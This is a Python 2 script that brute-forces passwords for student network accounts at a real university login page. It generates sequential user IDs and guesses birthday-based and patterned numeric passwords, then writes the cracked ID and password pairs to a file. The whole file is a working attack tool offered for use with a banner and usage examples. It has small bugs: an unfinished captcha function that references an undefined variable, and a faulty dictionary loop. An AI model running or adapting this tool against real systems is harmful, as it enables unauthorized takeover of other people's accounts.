#!/usr/bin/env python

# Author: Eular
# Date: 2014.8.11
# Version: 0.9

import sys
import requests
import itertools
import string

def check(uid,passwd):
    payload={'userId':uid,'passWd':passwd}
    url='http://nc.hust.edu.cn/service_ip_login.php'
    r=requests.post(url,data=payload,allow_redirects=False)

    if r.headers['location']=='service_ip_1.php':
        return True
    else:
        return False

def brute_crack(uid,passwdList):
    for pw in passwdList:
        #print 'try',pw,'...'
        if check(uid,pw):
            print '='*20
            print 'Successful Cracked!'
            print 'uid:',uid,'password:',pw
            return pw
    print '='*20
    print 'Failed to find password.'
    return 'null'

def getInfo(uid,pw):
    # captcha recognition
    codeurl='http://myself.hust.edu.cn:8080/selfservice/common/web/verifycode.jsp'
    # to be done

    url='http://myself.hust.edu.cn:8080/selfservice/'
    payload={'name':uid,'password':pw,'verify':captcha}
    r=requests.post(url,data=payload,allow_redirects=False)

def generatePasswdList(year,c=0):
    pwList=[]

    # birthday
    # total: 372
    month=['01','02','03','04','05','06','07','08','09','10','11','12']
    day=[(2-len(str(i)))*'0'+str(i) for i in range(1,32)]
    pwList+=[year+i+j for i,j in itertools.product(month,day)]

    if c:
        # common passwd
        # total: ????
        rules=['a'*8,'aaaabbbb','ab'*4,'abcd'*2,'aabbccdd']
        for r in rules:
            s=set(list(r))
            k=len(s)
            for i in itertools.permutations('0123456789',k):
                table=string.maketrans(''.join(s),''.join(i))
                pwList.append(r.translate(table))

    return pwList

def main(registerYear,startID,endID,pwlist):
    if pwlist=='null':
        # Create password dict according to the register year
        birthYear1=str(int(registerYear)-18)
        birthYear2=str(int(registerYear)-19)
        pwList=['12345678','87654321']
        pwList+=generatePasswdList(birthYear2)+generatePasswdList(birthYear1)
    else:
        f=open(pwlist,'r')
        pwList=[p.replace('\n','') for p in f.readlines()]
        f.close()

    # Bruteforce try the password
    cracked={}
    for ID in xrange(startID,endID+1):
        uid='U'+registerYear+str(ID)
        print 'Crack',uid
        pw=brute_crack(uid,pwList)
        print '='*20

        if pw!='null':
            cracked[uid]=pw
    return cracked

def banner():
    banner='''
                          ########                  #
                      #################            #
                   ######################         #
                  #########################      #
                ############################
               ##############################
               ###############################
              ###############################
              ##############################
                              #    ########   #
                 XX        XXX        ####   ##
                                      ###   ###
                                    ####   ###
               ####          ##########   ####
               #######################   ####
                 ####################   ####
                  ##################  ####
                    ############      ##
                       ########        ###
                      #########        #####
                    ############      ######
                   ########      #########
                     #####       ########
                       ###       #########
                      ######    ############
                     #######################
                     #   #   ###  #   #   ##
                     ########################
                      ##     ##   ##     ##
    '''
    print '='*60
    print banner.replace('X','\033[31mX\033[0m')
    print '='*60

def usage():
    print 'Usage:'
    print '      %s [options] [params]' % sys.argv[0]
    print 'Options:'
    print '         -y register year'
    print '         -c simgle one'
    print '         -r range of targets'
    print '         -w save the output into file'
    print '         -l use your password list'
    print 'Ex:'
    print '      %s -y 2012 -c 10086' % sys.argv[0]
    print '      %s -y 2012 -c 10086 -l pwlist.txt -w passwd.txt' % sys.argv[0]
    print '      %s -y 2012 -r 10086 12345' % sys.argv[0]
    print '='*60

if __name__=='__main__':
    banner()
    usage()
    if len(sys.argv)<5:
        pass
    else:
        year=sys.argv[2]
        opt=sys.argv[3]
        if opt=='-c':
            startID=endID=int(sys.argv[4])
        elif opt=='-r':
            startID=int(sys.argv[4])
            endID=int(sys.argv[5])

        if '-l' in sys.argv:
            i=sys.argv.index('-l')
            pwlist=sys.argv[i+1]
        else:
            pwlist='null'
        cracked=main(year,startID,endID,pwlist)

        if '-w' in sys.argv:
            i=sys.argv.index('-w')
            fname=sys.argv[i+1]
            f=open(fname,'w')
            for uid,pw in cracked:
                f.write(uid+' '+pw+'\n')
            f.close()
